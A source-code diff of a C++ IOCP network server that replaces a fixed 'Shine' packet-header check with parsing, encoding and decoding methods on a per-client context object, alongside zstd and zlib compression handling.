@@ -92,9 +92,6 @@ IOCPServer::IOCPServer(void)
 
 	m_hKillEvent = NULL;
 
-	memset(m_szPacketFlag, 0, sizeof(m_szPacketFlag));
-	memcpy(m_szPacketFlag,"Shine",FLAG_LENGTH);
-
 	m_NotifyProc = NULL;
 	m_OfflineProc = NULL;
 #if USING_CTX
@@ -488,37 +485,33 @@ BOOL IOCPServer::OnClientReceiving(PCONTEXT_OBJECT  ContextObject, DWORD dwTrans
 		//将接收到的数据拷贝到我们自己的内存中wsabuff    8192
 		ContextObject->InCompressedBuffer.WriteBuffer((PBYTE)ContextObject->szBuffer,dwTrans);
 		//查看数据包里的数据
-		while (ContextObject->InCompressedBuffer.GetBufferLength() > HDR_LENGTH)
+		while (true)
 		{
-			char szPacketFlag[FLAG_LENGTH + 3]= {0}; // 8字节对齐
-			ContextObject->InCompressedBuffer.CopyBuffer(szPacketFlag, FLAG_LENGTH, 0);
-			if (memcmp(m_szPacketFlag, szPacketFlag, FLAG_LENGTH) != 0) {
+			PR pr = ContextObject->Parse(ContextObject->InCompressedBuffer);
+			if (pr.IsFailed())
+			{
 				ContextObject->InCompressedBuffer.ClearBuffer();
 				break;
 			}
+			else if (pr.IsNeedMore()) {
+				break;
+			}
 			
-			//Shine[50][kdjfkdjfkj]
 			ULONG ulPackTotalLength = 0;
-			ContextObject->InCompressedBuffer.CopyBuffer(&ulPackTotalLength, sizeof(ULONG), FLAG_LENGTH);
+			ContextObject->InCompressedBuffer.CopyBuffer(&ulPackTotalLength, sizeof(ULONG), pr.Result);
 			//取出数据包的总长：5字节标识+4字节数据包总长度+4字节原始数据长度
 			int bufLen = ContextObject->InCompressedBuffer.GetBufferLength();
 			if (ulPackTotalLength && bufLen >= ulPackTotalLength)
 			{
+				ULONG ulCompressedLength = 0;
 				ULONG ulOriginalLength = 0;
-				ContextObject->InCompressedBuffer.ReadBuffer((PBYTE)szPacketFlag, FLAG_LENGTH);
-				ContextObject->InCompressedBuffer.ReadBuffer((PBYTE) &ulPackTotalLength, sizeof(ULONG));
-				ContextObject->InCompressedBuffer.ReadBuffer((PBYTE) &ulOriginalLength, sizeof(ULONG));
-				// TRACE("ulPackTotalLength: %d, ulOriginalLength: %d\n", ulPackTotalLength, ulOriginalLength);
-				ULONG ulCompressedLength = ulPackTotalLength - HDR_LENGTH; //461 - 13  448
-				PBYTE CompressedBuffer = new BYTE[ulCompressedLength];  //没有解压
-				//从数据包当前将源数据没有解压读取到pData   448
-				ContextObject->InCompressedBuffer.ReadBuffer(CompressedBuffer, ulCompressedLength);
+				PBYTE CompressedBuffer = ContextObject->ReadBuffer(ulCompressedLength, ulOriginalLength);
 				if (ContextObject->CompressMethod == COMPRESS_UNKNOWN) {
 					delete[] CompressedBuffer;
 					throw "Unknown method";
 				}
 				bool usingZstd = ContextObject->CompressMethod == COMPRESS_ZSTD, zlibFailed = false;
-				PBYTE DeCompressedBuffer = new BYTE[ulOriginalLength];  //解压过的内存  436
+				PBYTE DeCompressedBuffer = new BYTE[ulOriginalLength];  //解压过的内存
 				size_t	iRet = usingZstd ?
 					Muncompress(DeCompressedBuffer, &ulOriginalLength, CompressedBuffer, ulCompressedLength) :
 					uncompress(DeCompressedBuffer, &ulOriginalLength, CompressedBuffer, ulCompressedLength);
@@ -527,6 +520,7 @@ BOOL IOCPServer::OnClientReceiving(PCONTEXT_OBJECT  ContextObject, DWORD dwTrans
 					ContextObject->InDeCompressedBuffer.ClearBuffer();
 					//ContextObject->InCompressedBuffer.ClearBuffer();
 					ContextObject->InDeCompressedBuffer.WriteBuffer(DeCompressedBuffer, ulOriginalLength);
+					ContextObject->Decode(DeCompressedBuffer, ulOriginalLength);
 					m_NotifyProc(ContextObject);  //通知窗口
 				}else if (usingZstd){
 					// 尝试用zlib解压缩
@@ -534,6 +528,7 @@ BOOL IOCPServer::OnClientReceiving(PCONTEXT_OBJECT  ContextObject, DWORD dwTrans
 						ContextObject->CompressMethod = COMPRESS_ZLIB;
 						ContextObject->InDeCompressedBuffer.ClearBuffer();
 						ContextObject->InDeCompressedBuffer.WriteBuffer(DeCompressedBuffer, ulOriginalLength);
+						ContextObject->Decode(DeCompressedBuffer, ulOriginalLength);
 						m_NotifyProc(ContextObject);
 					} else {
 						zlibFailed = true;
@@ -593,6 +588,8 @@ VOID IOCPServer::OnClientPreSending(CONTEXT_OBJECT* ContextObject, PBYTE szBuffe
 				ZSTD_compressBound(ulOriginalLength) : (double)ulOriginalLength * 1.001 + 12;
 #endif
 			LPBYTE			CompressedBuffer = new BYTE[ulCompressedLength];
+			Buffer tmp(szBuffer, ulOriginalLength); szBuffer = tmp.Buf();
+			ContextObject->Encode(szBuffer, ulOriginalLength);
 			size_t	iRet = usingZstd ?
 				Mcompress(CompressedBuffer, &ulCompressedLength, (LPBYTE)szBuffer, ulOriginalLength):
 				compress(CompressedBuffer, &ulCompressedLength, (LPBYTE)szBuffer, ulOriginalLength);
@@ -606,11 +603,7 @@ VOID IOCPServer::OnClientPreSending(CONTEXT_OBJECT* ContextObject, PBYTE szBuffe
 
 			ulCompressedLength =  usingZstd ? iRet : ulCompressedLength;
 
-			ULONG ulPackTotalLength = ulCompressedLength + HDR_LENGTH;
-			ContextObject->OutCompressedBuffer.WriteBuffer((LPBYTE)m_szPacketFlag,FLAG_LENGTH);
-			ContextObject->OutCompressedBuffer.WriteBuffer((PBYTE)&ulPackTotalLength, sizeof(ULONG));
-			ContextObject->OutCompressedBuffer.WriteBuffer((PBYTE)&ulOriginalLength, sizeof(ULONG));
-			ContextObject->OutCompressedBuffer.WriteBuffer(CompressedBuffer, ulCompressedLength);
+			ContextObject->WriteBuffer(CompressedBuffer, ulCompressedLength, ulOriginalLength);
 			delete [] CompressedBuffer;
 		}
 
